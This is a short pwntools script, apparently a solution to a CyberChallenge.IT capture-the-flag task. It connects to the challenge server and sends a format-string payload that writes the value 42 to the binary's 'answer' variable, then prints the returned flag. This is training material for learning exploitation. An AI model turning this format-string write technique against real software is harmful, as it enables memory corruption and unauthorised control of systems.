from pwn import *

exe = ELF("/home/spatola/workspace/cyberchallenge/software-security/sw-2/answare/the_answer")
r = remote('answer.challs.cyberchallenge.it', 9122)

f = b'%42c%12$llnAAAAA' + p64(exe.symbols.answer)
# f = fmtstr_payload(10, {exe.symbols['answer']: 42})
# print(f)
r.sendlineafter(b'name?', f)
print(r.recvuntil(b'your flag:\n'))
print(r.clean().decode())
r.close()